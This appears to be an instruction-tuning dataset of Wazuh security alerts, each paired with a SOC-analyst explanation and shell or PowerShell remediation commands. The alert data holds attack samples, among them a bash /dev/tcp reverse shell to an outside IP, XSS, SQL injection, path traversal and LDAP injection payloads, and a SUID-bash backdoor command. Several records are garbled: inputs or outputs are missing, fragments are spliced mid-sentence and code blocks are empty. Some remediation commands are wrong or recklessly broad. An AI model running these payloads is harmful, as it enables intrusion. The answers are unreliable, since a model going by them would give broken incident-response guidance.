instruction: You are a SOC Analyst. Analyze this Wazuh security alert and provide a brief explanation and a specific remediation command.
input: {"timestamp": "2024-03-15T02:14:33.441Z", "rule": {"id": "5712", "level": 10, "description": "SSHD brute force trying to get access to the system.", "groups": ["syslog", "sshd", "authentication_failures"]}, "agent": {"id": "003", "name": "prod-web-01", "ip": "192.168.1.45"}, "data": {"srcip": "45.33.32.156", "srcport": "54312", "dstuser": "root"}, "full_log": "Failed password for root from 45.33.32.156 port 54312 ssh2", "decoder": {"name": "sshd"}}
output:
ALERT ANALYSIS: SSH brute force attack detected against the root account on prod-web-01 (192.168.1.45) originating from external IP 45.33.32.156. Rule 5712 triggered after repeated authentication failures, consistent with automated credential stuffing (likely Hydra or Medusa). Root login via SSH should be disabled entirely. REMEDIATION: Block the attacking IP immediately and harden SSH config.

```bash
# Block attacker IP via UFW
sudo ufw deny from 45.33.32.156 to any
# Disable root SSH login
sudo sed -i 's/^PermitRootLogin yes/PermitRootLogin no/' /etc/ssh/sshd_config && sudo systemctl restart sshd
# Verify the block
sudo ufw status | grep 45.33.32.156
```

instruction: You are a SOC Analyst. Analyze this Wazuh security alert and provide a brief explanation and a specific remediation command.
input: {"timestamp": "2024-03-15T03:27:11.882Z", "rule": {"id": "5720", "level": 10, "description": "Multiple failed SSH login attempts (Hydra).", "groups": ["syslog", "sshd", "authentication_failures"]}, "agent": {"id": "007", "name": "db-server-02", "ip": "192.168.2.10"}, "data": {"srcip": "203.0.113.77", "srcport": "61234", "dstuser": "admin"}, "full_log": "Failed password for admin from 203.0.113.77 port 61234 ssh2 - Possible Hydra attack", "decoder": {"name": "sshd"}}
output:
ALERT ANALYSIS: Hydra-based SSH brute force attack detected against the 'admin' account on db-server-02 (192.168.2.10) from 203.0.113.77. The pattern of rapid sequential login attempts matches Hydra's default threading behavior. A database server exposed to this type of attack poses critical risk. REMEDIATION: Block the source IP, install and configure fail2ban for ongoing protection, and restrict SSH to trusted networks only.


instruction: You are a SOC Analyst. Analyze this Wazuh security alert and provide a brief explanation and a specific remediation command.
input: {"timestamp": "2024-03-15T04:05:59.123Z", "rule": {"id": "40111", "level": 13, "description": "File integrity monitoring (FIM): /etc/shadow modified.", "groups": ["syscheck", "pci_dss_11.5", "fim"]}, "agent": {"id": "005", "name": "auth-server-01", "ip": "192.168.3.20"}, "syscheck": {"path": "/etc/shadow", "event": "modified", "md5_after": "d8e8fca2dc0f896fd7cb4cb0031ba249", "md5_before": "a87ff679a2f3e71d9181a67b7542122c", "uid_after": "0", "gid_after": "0"}, "full_log": "File '/etc/shadow' modified. Mode changed."}
output:
ALERT ANALYSIS: CRITICAL - The /etc/shadow file was modified on auth-server-01 (192.168.3.20). This file stores hashed user passwords and should almost never change outside of scheduled password updates. Unauthorized modification could indicate a new rogue user account was created, an existing password hash was replaced (privilege escalation), or a rootkit/persistence mechanism was installed. Immediate investigation is mandatory. REMEDIATION: Freeze logins, audit the file, and identify the modifying process.

```bash
# Check who last modified /etc/shadow and when
stat /etc/shadow
# Diff current shadow against last known good backup
diff /etc/shadow /var/backups/shadow.bak
# Check for new/modified accounts added in the last 24 hours
awk -F: '{print $1, $3}' /etc/passwd | sort -t: -k3 -n | tail -20
# Audit recent commands run as root
last -n 20 && grep 'shadow' /var/log/auth.log | tail -30
# Lock all non-essential accounts pending investigation
sudo passwd -l suspicious_user
```

instruction: You are a SOC Analyst. Analyze this Wazuh security alert and provide a brief explanation and a specific remediation command.
input: {"timestamp": "2024-03-15T05:11:44.001Z", "rule": {"id": "31103", "level": 9, "description": "Web attack: SQL injection attempt detected.", "groups": ["web", "accesslog", "attack", "sql_injection"]}, "agent": {"id": "009", "name": "web-frontend-03", "ip": "192.168.1.80"}, "data": {"srcip": "185.220.101.45", "url": "/login.php?user=admin'--&pass=x", "method": "GET", "protocol": "HTTP/1.1", "id": "404"}, "full_log": "185.220.101.45 - - [15/Mar/2024:05:11:44 +0000] \"GET /login.php?user=admin'--&pass=x HTTP/1.1\" 404 512"}
output:
ALERT ANALYSIS: SQL injection attempt detected on web-frontend-03 (192.168.1.80) from 185.220.101.45. The payload 'admin'--' is a classic authentication bypass attempt targeting the login endpoint. The 404 response suggests the page may not exist, but the attack pattern warrants blocking as the attacker is likely scanning/probing. This IP (185.220.101.45) is associated with Tor exit nodes frequently used to mask SQLi campaigns. REMEDIATION: Block the IP at the firewall, enable ModSecurity WAF rules, and verify parameterized queries in application code.

```bash
# Block the attacking IP
sudo ufw deny from 185.220.101.45 to any
# Enable ModSecurity WAF with OWASP ruleset if using Apache
```

instruction: You are a SOC Analyst. Analyze this Wazuh security alert and provide a brief explanation and a specific remediation command.
input: {"timestamp": "2024-03-15T06:33:22.774Z", "rule": {"id": "60102", "level": 12, "description": "Windows Defender detected malware: Trojan:Win32/Emotet", "groups": ["windows", "defender", "malware"]}, "agent": {"id": "021", "name": "WORKSTATION-HR-05", "ip": "192.168.10.55"}, "data": {"ThreatName": "Trojan:Win32/Emotet", "ThreatID": "2147724809", "ProcessName": "C:\\Users\\jdoe\\AppData\\Roaming\\svchst.exe", "Path": "C:\\Users\\jdoe\\AppData\\Roaming\\svchst.exe", "Action": "Quarantined", "Severity": "Severe"}, "full_log": "Windows Defender: Severe threat Trojan:Win32/Emotet quarantined at C:\\Users\\jdoe\\AppData\\Roaming\\svchst.exe"}
output:
ALERT ANALYSIS: CRITICAL - Emotet Trojan detected on WORKSTATION-HR-05 (192.168.10.55) in user jdoe's AppData directory. Emotet is a sophisticated banking trojan and malware loader known for lateral movement, credential harvesting, and dropping secondary payloads (TrickBot, Ryuk ransomware). While Defender quarantined the file, the machine must be treated as fully compromised. Isolate immediately. REMEDIATION: Isolate the host from the network, force a full scan, and begin incident response procedures.

```powershell
# Isolate the machine from the network immediately (Windows Defender for Endpoint)
Add-MpPreference -ExclusionPath $null  # Clear any exclusions first
# Disable network adapters to contain spread
Get-NetAdapter | Disable-NetAdapter -Confirm:$false
# Force a full Windows Defender scan
Start-MpScan -ScanType FullScan
# Remove any persistence mechanisms in Run keys
Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name '*svchst*' -ErrorAction SilentlyContinue
# Get full threat report
Get-MpThreatDetection | Format-List
```

instruction: You are a SOC Analyst. Analyze this Wazuh security alert and provide a brief explanation and a specific remediation command.
input: {"timestamp": "2024-03-15T07:45:01.332Z", "rule": {"id": "40101", "level": 8, "description": "Nmap stealth scan (SYN scan) detected from remote host.", "groups": ["network", "scan", "recon"]}, "agent": {"id": "001", "name": "firewall-gw-01", "ip": "192.168.0.1"}, "data": {"srcip": "91.108.4.200", "dstip": "192.168.0.1", "protocol": "TCP", "flags": "SYN", "packets": "1024"}, "full_log": "Possible Nmap SYN scan detected: 1024 SYN packets from 91.108.4.200 in 5 seconds"}
output:
ALERT ANALYSIS: Nmap SYN (stealth) scan detected originating from 91.108.4.200 targeting the gateway firewall (192.168.0.1). 1,024 SYN packets in 5 seconds is a clear indicator of automated port scanning. This is a reconnaissance activity typically preceding an attack. The attacker is mapping open ports and services. REMEDIATION: Block the scanning IP, enable port scan detection rules, and implement SYN flood protection.

```bash
# Block the scanning IP via iptables
sudo iptables -A INPUT -s 91.108.4.200 -j DROP
sudo iptables -A INPUT -s 91.108.4.200 -j LOG --log-prefix "BLOCKED_SCANNER: "
# Enable SYN cookie protection against SYN floods
sudo sysctl -w net.ipv4.tcp_syncookies=1
echo 'net.ipv4.tcp_syncookies=1' | sudo tee -a /etc/sysctl.conf
# Rate-limit SYN packets from any single source
sudo iptables -A INPUT -p tcp --syn -m limit --limit 1/s --limit-burst 3 -j ACCEPT
sudo iptables -A INPUT -p tcp --syn -j DROP
# Save iptables rules persistently
sudo iptables-save | sudo tee /etc/iptables/rules.v4
```

instruction: You are a SOC Analyst. Analyze this Wazuh security alert and provide a brief explanation and a specific remediation command.
input: {"timestamp": "2024-03-15T09:14:05.229Z", "rule": {"id": "40112", "level": 14, "description": "FIM: /etc/passwd modified.", "groups": ["syscheck", "fim", "pci_dss_11.5"]}, "agent": {"id": "005", "name": "auth-server-01", "ip": "192.168.3.20"}, "syscheck": {"path": "/etc/passwd", "event": "modified", "md5_after": "b14a7b8059d9c055954c92674ce60032", "md5_before": "eccbc87e4b5ce2fe28308fd9f2a7baf3", "uid_after": "0"}, "full_log": "File '/etc/passwd' modified by UID 0."}
output:
ALERT ANALYSIS: CRITICAL - /etc/passwd was modified by UID 0 (root) on auth-server-01 (192.168.3.20). This is a high-severity event indicating a potential new account creation, UID manipulation for privilege escalation, or persistence mechanism by an attacker who has already achieved root access. This alert combined with any prior /etc/shadow modification is a strong indicator of full system compromise. REMEDIATION: Audit new accounts, check for UID-0 clones, and lock down the system.

```bash
# Check for any accounts with UID 0 (should only be root)
awk -F: '($3 == 0) {print}' /etc/passwd
# Compare current passwd against backup
diff /etc/passwd /var/backups/passwd.bak
# List recently added users
getent passwd | sort -t: -k3 -n | tail -10
# Check auth log for su/sudo activity by root
grep 'useradd\|adduser' /var/log/auth.log | tail -20
# Lock any suspicious newly added account
sudo usermod -L suspicious_username
sudo chattr +i /etc/passwd /etc/shadow
```

instruction: You are a SOC Analyst. Analyze this Wazuh security alert and provide a brief explanation and a specific remediation command.
input: {"timestamp": "2024-03-15T10:22:48.771Z", "rule": {"id": "31106", "level": 10, "description": "Web attack: XSS (Cross-Site Scripting) attempt detected.", "groups": ["web", "accesslog", "attack", "xss"]}, "agent": {"id": "009", "name": "web-frontend-03", "ip": "192.168.1.80"}, "data": {"srcip": "104.21.44.201", "url": "/search?q=<script>alert(document.cookie)</script>", "method": "GET", "status": "200"}, "full_log": "104.21.44.201 - - GET /search?q=<script>alert(document.cookie)</script> HTTP/1.1 200"}
output:
ALERT ANALYSIS: Reflected XSS attack detected on web-frontend-03 (192.168.1.80) from 104.21.44.201. The payload targets the /search endpoint with a classic cookie-stealing script. The 200 response status is alarming — it may indicate the payload was reflected back to the user without proper sanitization, creating a real vulnerability window. REMEDIATION: Block the source IP, patch the vulnerable endpoint with output encoding, and enforce Content Security Policy headers.

```bash
# Block the source IP
sudo ufw deny from 104.21.44.201 to any
# Add Content-Security-Policy header to Apache/Nginx config
# For Nginx:
sudo sed -i '/server {/a \    add_header Content-Security-Policy "default-src '''self'''";' /etc/nginx/sites-available/default
sudo nginx -t && sudo systemctl reload nginx
# Search for successful XSS reflections in access log
grep '104.21.44.201' /var/log/nginx/access.log | grep -i 'script' | grep ' 200 '
# Enable ModSecurity XSS rules
echo 'SecRule REQUEST_URI "@detectXSS" "id:1001,phase:2,deny,status:403,msg:XSS Attempt"' | sudo tee -a /etc/modsecurity/custom.conf
```

input: {"timestamp": "2024-03-15T11:05:33.002Z", "rule": {"id": "60201", "level": 12, "description": "Windows Defender: Ransomware behavior detected - mass file encryption.", "groups": ["windows", "defender", "ransomware"]}, "agent": {"id": "034", "name": "FILE-SERVER-01", "ip": "192.168.20.100"}, "data": {"ThreatName": "Ransom:Win32/WannaCrypt", "ProcessName": "C:\\Windows\\Temp\\tasksche.exe", "Action": "Detected", "Severity": "Critical", "FilesAffected": "847"}, "full_log": "Windows Defender: Ransomware WannaCrypt detected. 847 files encrypted. Process: tasksche.exe"}
output:
ALERT ANALYSIS: CRITICAL INCIDENT - WannaCry ransomware detected on FILE-SERVER-01 (192.168.20.100) with 847 files already encrypted. WannaCry exploits EternalBlue (MS17-010) for lateral movement via SMB. FILE-SERVER-01 likely contains critical shared data. Every second of delay means more encrypted files and potential spread to other systems. This is a P1 incident requiring immediate containment. REMEDIATION: Emergency network isolation and process termination.

```powershell
# IMMEDIATE: Disable all network interfaces to stop lateral movement
Get-NetAdapter | Disable-NetAdapter -Confirm:$false
# Kill the ransomware process
Stop-Process -Name 'tasksche' -Force -ErrorAction SilentlyContinue
Stop-Process -Name 'mssecsvc' -Force -ErrorAction SilentlyContinue
# Disable SMBv1 to prevent EternalBlue exploitation
Set-SmbServerConfiguration -EnableSMB1Protocol $false -Force
# Disable SMB shares entirely
Get-SmbShare | Remove-SmbShare -Force
# Apply MS17-010 patch check
Get-HotFix -Id KB4012212
# Snapshot current state for forensics before remediation
wevtutil epl System C:\forensics\System_$(Get-Date -f yyyyMMdd).evtx
```

instruction: You are a SOC Analyst. Analyze this Wazuh security alert and provide a brief explanation and a specific remediation command.
input: {"timestamp": "2024-03-15T12:17:44.990Z", "rule": {"id": "5502", "level": 9, "description": "Login session opened for user by logind (User not in sudoers).", "groups": ["syslog", "su", "pam"]}, "agent": {"id": "008", "name": "devops-server-01", "ip": "192.168.5.12"}, "data": {"srcuser": "deploy", "dstuser": "root", "terminal": "pts/2"}, "full_log": "pam_unix(su:session): session opened for user root by deploy(uid=1005)"}
output:
ALERT ANALYSIS: Unexpected privilege escalation detected on devops-server-01 (192.168.5.12). The 'deploy' service account (UID 1005) opened a root session via su. Service accounts should never need interactive root sessions. This could indicate credential theft of root password, exploitation of a SUID binary, or an insider threat using the deploy account as a pivot point. REMEDIATION: Terminate the session, audit the path used for escalation, and restrict su access.

```bash
# Identify and kill the suspicious root session
who | grep deploy
# Find the PTS session PID
ps aux | grep pts/2
# Kill the session
sudo pkill -9 -t pts/2
# Lock the deploy account temporarily
sudo passwd -l deploy
# Restrict su to members of a specific group only
sudo dpkg -l libpam-modules
echo 'auth required pam_wheel.so use_uid' | sudo tee -a /etc/pam.d/su
sudo groupadd suusers
# Audit what commands were run in that root session
grep 'pts/2' /var/log/auth.log | tail -30
```

instruction: You are a SOC Analyst. Analyze this Wazuh security alert and provide a brief explanation and a specific remediation command.
input: {"timestamp": "2024-03-15T13:29:12.115Z", "rule": {"id": "40301", "level": 11, "description": "Possible port scan: Multiple connection attempts to different ports.", "groups": ["network", "scan", "recon"]}, "agent": {"id": "002", "name": "dmz-server-01", "ip": "192.168.50.5"}, "data": {"srcip": "78.141.209.144", "ports_scanned": "22,80,443,3306,5432,6379,27017,8080,8443", "timewindow": "10s"}, "full_log": "Port scan detected from 78.141.209.144: ports 22,80,443,3306,5432,6379,27017,8080,8443 in 10 seconds"}
output:
ALERT ANALYSIS: Aggressive port scan from 78.141.209.144 against dmz-server-01 (192.168.50.5). The target ports (22=SSH, 3306=MySQL, 5432=PostgreSQL, 6379=Redis, 27017=MongoDB, 8080/8443=alt-HTTP) indicate the attacker is mapping all database and service ports — a precursor to targeted exploitation. The DMZ placement of this server makes this especially concerning. REMEDIATION: Block the IP, close all non-essential ports, and move databases off the DMZ.

```bash
# Block the scanner
sudo ufw deny from 78.141.209.144 to any
# Close all non-essential ports — only allow HTTP/HTTPS from DMZ
sudo ufw default deny incoming
sudo ufw allow 80/tcp
sudo ufw allow 443/tcp
sudo ufw deny 3306/tcp
sudo ufw deny 5432/tcp
sudo ufw deny 6379/tcp
sudo ufw deny 27017/tcp
# Verify current open ports
sudo ss -tlnp
# Log and drop all future scans via iptables
sudo iptables -A INPUT -m recent --name portscan --rcheck --seconds 60 --hitcount 5 -j DROP
```

instruction: You are a SOC Analyst. Analyze this Wazuh security alert and provide a brief explanation and a specific remediation command.
input: {"timestamp": "2024-03-15T14:01:55.663Z", "rule": {"id": "5503", "level": 10, "description": "User missed the password more than one time.", "groups": ["syslog", "sshd", "authentication_failures"]}, "agent": {"id": "015", "name": "vpn-gateway-01", "ip": "192.168.0.254"}, "data": {"srcip": "192.168.10.88", "dstuser": "vpnadmin", "failures": "15"}, "full_log": "pam_unix(sshd:auth): authentication failure; user=vpnadmin rhost=192.168.10.88 15 failures"}

input: {"timestamp": "2024-03-15T14:45:30.001Z", "rule": {"id": "31151", "level": 9, "description": "Web attack: Path traversal attempt.", "groups": ["web", "accesslog", "attack", "path_traversal"]}, "agent": {"id": "009", "name": "web-frontend-03", "ip": "192.168.1.80"}, "data": {"srcip": "162.55.36.211", "url": "/download?file=../../etc/passwd", "method": "GET", "status": "403"}, "full_log": "162.55.36.211 - - GET /download?file=../../etc/passwd HTTP/1.1 403"}
output:
ALERT ANALYSIS: Path traversal (directory traversal) attack detected on web-frontend-03 (192.168.1.80) from 162.55.36.211. The attacker is attempting to read /etc/passwd via a file download parameter using '../' sequences. The 403 response indicates the current config blocked it, but the vulnerability may still exist if the web server's input validation is the only control. REMEDIATION: Block the IP, harden the download endpoint, and sanitize file path parameters.

```bash
# Block the attacker
sudo ufw deny from 162.55.36.211 to any
# Scan for all path traversal attempts in logs
grep '162.55.36.211' /var/log/nginx/access.log | grep -E '\.\./'
# Enable PHP open_basedir restriction (if PHP app)
sudo sed -i 's/^;open_basedir =/open_basedir = \/var\/www\/html\//' /etc/php/8.1/apache2/php.ini
sudo systemctl restart apache2
# Disable following symlinks in Nginx
echo 'disable_symlinks on;' | sudo tee -a /etc/nginx/nginx.conf
sudo nginx -t && sudo systemctl reload nginx
# Check if any sensitive files were actually served
grep '/etc/passwd\|/etc/shadow' /var/log/nginx/access.log | grep -v ' 403 '
```

instruction: You are a SOC Analyst. Analyze this Wazuh security alert and provide a brief explanation and a specific remediation command.
input: {"timestamp": "2024-03-15T15:30:09.441Z", "rule": {"id": "554", "level": 7, "description": "File added to the system: new executable in /tmp.", "groups": ["syscheck", "fim", "suspicious"]}, "agent": {"id": "006", "name": "build-server-01", "ip": "192.168.6.77"}, "syscheck": {"path": "/tmp/backdoor.sh", "event": "added", "size": "4096", "permissions": "-rwxrwxrwx", "md5": "5d41402abc4b2a76b9719d911017c592"}, "full_log": "New file '/tmp/backdoor.sh' added with permissions 777."}
output:
ALERT ANALYSIS: CRITICAL - A new executable script named 'backdoor.sh' was created in /tmp with world-writable (777) permissions on build-server-01 (192.168.6.77). The filename itself and its placement in /tmp (a common attacker staging directory) are strong indicators of malicious post-exploitation activity. An attacker likely has shell access and is staging persistence mechanisms or C2 communication scripts. REMEDIATION: Immediately contain, capture the file for analysis, and remove it.

```bash
# DO NOT EXECUTE - capture for forensics first
cp /tmp/backdoor.sh /var/forensics/backdoor_$(date +%Y%m%d%H%M%S).sh
md5sum /tmp/backdoor.sh
# Examine the file contents safely
cat /tmp/backdoor.sh
# Check what process created this file
fuser /tmp/backdoor.sh
lsof /tmp/backdoor.sh
# Remove the malicious file
rm -f /tmp/backdoor.sh
# Check for other suspicious files in /tmp
find /tmp /var/tmp -type f -newer /var/log/syslog -ls
# Mount /tmp as noexec to prevent execution of future scripts
mount -o remount,noexec /tmp
echo 'tmpfs /tmp tmpfs defaults,noexec,nosuid 0 0' | sudo tee -a /etc/fstab
```

instruction: You are a SOC Analyst. Analyze this Wazuh security alert and provide a brief explanation and a specific remediation command.

Parent: cmd.exe, Child: powershell.exe"}

Mimikatz executed via PowerShell from cmd.exe is a classic lateral movement and credential harvesting technique. On a DC, this means all domain credentials (NTLM hashes, Kerberos tickets) are at risk. Assume all domain accounts are compromised. REMEDIATION: Isolate the DC, reset KRBTGT account (Golden Ticket prevention), and force password resets.

```powershell
# Immediately isolate the DC from the network
Get-NetAdapter | Disable-NetAdapter -Confirm:$false
# Kill PowerShell and CMD sessions
Get-Process powershell | Stop-Process -Force
Get-Process cmd | Stop-Process -Force
# Force Windows Defender full scan
Start-MpScan -ScanType FullScan
# Reset KRBTGT password TWICE (prevents Golden Ticket attacks)
# Run on a secondary DC or via ADUC after DC is restored
# Reset-KrbtgtKeyInteractive  # Use Microsoft's script
# Force all domain users to reset passwords at next logon
Get-ADUser -Filter * | Set-ADUser -ChangePasswordAtLogon $true
# Enable Protected Users security group for all admin accounts
Add-ADGroupMember -Identity 'Protected Users' -Members (Get-ADGroupMember 'Domain Admins')
```

input: {"timestamp": "2024-03-15T21:13:55.009Z", "rule": {"id": "5104", "level": 10, "description": "Root command execution: Suspicious command run by root.", "groups": ["rootcheck", "privilege_escalation"]}, "agent": {"id": "007", "name": "db-server-02", "ip": "192.168.2.10"}, "data": {"command": "chmod 4755 /bin/bash", "uid": "0", "user": "root"}, "full_log": "Root executed: chmod 4755 /bin/bash on db-server-02"}
output:
ALERT ANALYSIS: CRITICAL - The command 'chmod 4755 /bin/bash' was executed as root on db-server-02 (192.168.2.10). Setting the SUID bit on /bin/bash is a textbook Linux privilege escalation backdoor — any user who runs '/bin/bash -p' will get a root shell. This strongly indicates an attacker with root access is planting a persistent privilege escalation mechanism. This is active post-exploitation. REMEDIATION: Immediately remove the SUID bit, audit who executed this command, and perform full IR.

```bash
# IMMEDIATELY remove the SUID bit from bash
sudo chmod 0755 /bin/bash
# Verify the fix
ls -la /bin/bash
# Check for other SUID binaries that shouldn't be SUID
find / -perm -4000 -type f 2>/dev/null | grep -v -E '(su|sudo|newgrp|passwd|gpasswd|pkexec|mount|umount|ping|chsh|chfn|traceroute|crontab)'
# Audit recent root commands in bash history
cat /root/.bash_history | tail -50
# Check auth logs for root login activity
grep 'root' /var/log/auth.log | grep -E 'session opened|sudo' | tail -30
# Scan for other backdoors
sudo find /bin /usr/bin /usr/local/bin -newer /var/log/syslog -ls
```

input: {"timestamp": "2024-03-15T23:05:14.887Z", "rule": {"id": "40201", "level": 10, "description": "Nmap OS fingerprinting scan detected.", "groups": ["network", "scan", "recon"]}, "agent": {"id": "001", "name": "firewall-gw-01", "ip": "192.168.0.1"}, "data": {"srcip": "109.234.36.55", "scan_type": "OS_FINGERPRINT", "ttl_values": "multiple", "window_sizes": "multiple"}, "full_log": "Nmap OS fingerprinting (nmap -O) detected from 109.234.36.55 targeting 192.168.0.1"}
output:
ALERT ANALYSIS: Nmap OS fingerprinting scan (-O flag) detected from 109.234.36.55 targeting the firewall gateway (192.168.0.1). OS fingerprinting sends crafted TCP/IP packets to determine the operating system, which is used to select OS-specific exploits. This indicates the attacker has progressed from simple port scanning to targeted exploit preparation. REMEDIATION: Block the IP, randomize TCP/IP stack fingerprinting, and audit firewall rules.

```bash
# Block the IP immediately
sudo ufw deny from 109.234.36.55 to any
# Randomize IP ID to make OS fingerprinting harder
sudo sysctl -w net.ipv4.ip_default_ttl=128
echo 'net.ipv4.ip_default_ttl=128' | sudo tee -a /etc/sysctl.conf
# Enable TCP timestamps randomization
sudo sysctl -w net.ipv4.tcp_timestamps=0
echo 'net.ipv4.tcp_timestamps=0' | sudo tee -a /etc/sysctl.conf
# Apply changes
sudo sysctl -p
# Use iptables to block ICMP used for OS fingerprinting

```

User: itadmin"}
output:
ALERT ANALYSIS: CRITICAL - Fileless malware attack detected on WORKSTATION-IT-01 (192.168.25.7). A Base64-encoded PowerShell download cradle (IEX) was spawned by Outlook — classic phishing-delivered malware execution. The '-nop -w hidden' flags indicate deliberate AV evasion. The 'itadmin' user account executing this elevates the risk significantly, as it likely has admin privileges. REMEDIATION: Kill the process, isolate the machine, decode the payload for analysis.

```powershell
# Kill the hidden PowerShell process immediately
Get-Process powershell | Where-Object { $_.MainWindowTitle -eq '' } | Stop-Process -Force
# Decode the Base64 payload for analysis (do NOT execute)
[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQ...'))
# Isolate the machine
Get-NetAdapter | Disable-NetAdapter -Confirm:$false
# Enable PowerShell Script Block Logging for forensics
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging' -Name 'EnableScriptBlockLogging' -Value 1
# Restrict PowerShell execution policy
Set-ExecutionPolicy -ExecutionPolicy AllSigned -Scope LocalMachine -Force
# Check for persistence in scheduled tasks
Get-ScheduledTask | Where-Object { $_.Actions.Execute -match 'powershell' }
```

output:
ALERT ANALYSIS: CRITICAL - /etc/sudoers was modified on app-server-04 (192.168.4.33). The sudoers file controls which users can run commands as root. input: {"timestamp": "2024-03-16T10:11:09.997Z", "rule": {"id": "60106", "level": 10, "description": "Windows: LSASS memory access detected (credential dumping).", "groups": ["windows", "credential_dumping", "lsass"]}, "agent": {"id": "042", "name": "DC-01", "ip": "192.168.100.10"}, "data": {"SourceImage": "C:\\Windows\\System32\\cmd.exe", "TargetImage": "C:\\Windows\\System32\\lsass.exe", "GrantedAccess": "0x1010", "User": "SYSTEM"}, "full_log": "Suspicious LSASS memory access: cmd.exe -> lsass.exe GrantedAccess: 0x1010"}
output:
ALERT ANALYSIS: CRITICAL - LSASS process memory access detected on DC-01 (192.168.100.10). cmd.exe accessing lsass.exe with GrantedAccess 0x1010 (PROCESS_VM_READ | PROCESS_QUERY_LIMITED_INFORMATION) is a known credential dumping pattern used by Mimikatz, ProcDump, and similar tools. On the Domain Controller, lsass contains all active domain user credentials. This is potentially a full domain credential compromise event. REMEDIATION: Protect LSASS with PPL, audit all credentials, force resets.

```powershell
# Enable LSASS Protected Process Light (PPL) to prevent future access
New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa' -Name 'RunAsPPL' -Value 1 -PropertyType DWORD -Force
# Enable Credential Guard
# First check if Virtualization Based Security is supported
Get-WmiObject -Class Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard
# Enable via registry
New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard' -Name 'EnableVirtualizationBasedSecurity' -Value 1 -PropertyType DWORD -Force
# Audit LSASS access in Sysmon (add rule for future detection)
# Kill any suspicious processes accessing LSASS
Get-Process cmd | Stop-Process -Force
# Force password reset for all privileged accounts immediately
Get-ADGroupMember 'Domain Admins' | Set-ADUser -ChangePasswordAtLogon $true
```

ALERT ANALYSIS: LDAP injection attack detected on web-frontend-03 (192.168.1.80) from 91.92.251.78. The payload '*)(objectClass=*)' is a classic LDAP injection that attempts to bypass authentication by returning all directory entries. input: {"timestamp": "2024-03-16T22:01:33.118Z", "rule": {"id": "5104", "level": 12, "description": "Suspicious use of /dev/tcp for reverse shell.", "groups": ["rootcheck", "network", "reverse_shell"]}, "agent": {"id": "011", "name": "mail-server-01", "ip": "192.168.7.22"}, "data": {"command": "bash -i >& /dev/tcp/203.0.113.50/9001 0>&1", "uid": "0", "user": "root"}, "full_log": "Root executed reverse shell: bash -i >& /dev/tcp/203.0.113.50/9001 0>&1"}

```bash

# First find the specific PID
```

input: {"timestamp": "2024-03-17T01:28:07.661Z", "rule": {"id": "60109", "level": 10, "description": "Windows: Pass-the-Hash attack attempt detected.", "groups": ["windows", "credential_attack", "lateral_movement"]}, "agent": {"id": "072", "name": "WORKSTATION-DEV-07", "ip": "192.168.25.80"}, "data": {"EventID": "4624", "LogonType": "3", "LogonProcessName": "NtLmSsp", "TargetUserName": "Administrator", "WorkstationName": "WORKSTATION-DEV-07", "IpAddress": "192.168.25.80"}, "full_log": "Pass-the-Hash: NtLmSsp network logon for Administrator from local machine. LogonType 3 with NTLM."}
output:
ALERT ANALYSIS: Pass-the-Hash (PtH) attack detected on WORKSTATION-DEV-07 (192.168.25.80). An NTLM network logon (LogonType 3) for the Administrator account using NtLmSsp from the machine itself indicates Mimikatz-style PtH lateral movement. The attacker has obtained the NTLM hash of the Administrator account and is authenticating without knowing the plaintext password. REMEDIATION: Reset Administrator hash, disable NTLM where possible, enforce Kerberos.

```powershell
# Force reset of the local Administrator account password
Net User Administrator (New-Guid).ToString().Replace('-','').Substring(0,16)
# Disable the local Administrator account
Disable-LocalUser -Name 'Administrator'
# Disable NTLM authentication at the domain level via GPO
Set-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa' -Name 'LmCompatibilityLevel' -Value 5
# Enable Kerberos armoring and disable NTLM fallback
Set-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\MSV1_0' -Name 'RestrictSendingNTLMTraffic' -Value 2
# Check for lateral movement - connections from this machine to other hosts
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4624} | Where-Object {$_.Message -match 'NtLmSsp'} | Select-Object -First 20 TimeCreated, Message
# Enable audit for credential validation
AuditPol /set /subcategory:'Credential Validation' /success:enable /failure:enable
```

input: {"timestamp": "2024-03-17T05:14:08.229Z", "rule": {"id": "5712", "level": 10, "description": "SSH brute force using distributed IPs (botnet pattern).", "groups": ["sshd", "authentication_failures", "botnet"]}, "agent": {"id": "008", "name": "devops-server-01", "ip": "192.168.5.12"}, "data": {"unique_source_ips": "47", "dstuser": "root", "failures": "470", "timewindow": "120s", "countries": "CN,RU,BR,KR,IN"}, "full_log": "Distributed SSH brute force: 470 failures from 47 unique IPs across 5 countries in 120s targeting root"}
output:
ALERT ANALYSIS: Coordinated botnet SSH brute force detected against devops-server-01 (192.168.5.12). 470 attempts from 47 unique IPs across 5 countries in 120 seconds indicates a distributed botnet campaign designed to evade traditional per-IP rate limiting and fail2ban. Each individual IP stays under the threshold while collectively delivering high-volume attacks. Standard IP blocking is insufficient. REMEDIATION: Implement geoblocking, disable password auth, enforce key-only SSH.

```bash
# Install and configure geoip blocking
sudo apt-get install -y xtables-addons-common libtext-csv-xs-perl
# Block SSH from high-risk countries (CN, RU, BR, KR, IN) using iptables geoip
# First update geoip database
sudo /usr/lib/xtables-addons/xt_geoip_dl
# Block countries
for COUNTRY in CN RU BR KR IN; do sudo iptables -A INPUT -p tcp --dport 22 -m geoip --source-country $COUNTRY -j DROP; done
# Disable SSH password authentication (MOST IMPORTANT)
sudo sed -i 's/^#\?PasswordAuthentication.*/PasswordAuthentication no/' /etc/ssh/sshd_config
sudo sed -i 's/^#\?PermitRootLogin.*/PermitRootLogin no/' /etc/ssh/sshd_config
sudo systemctl restart sshd
# Increase fail2ban ban time for distributed attacks
sudo sed -i 's/bantime.*/bantime = 86400/' /etc/fail2ban/jail.local
sudo systemctl restart fail2ban
```

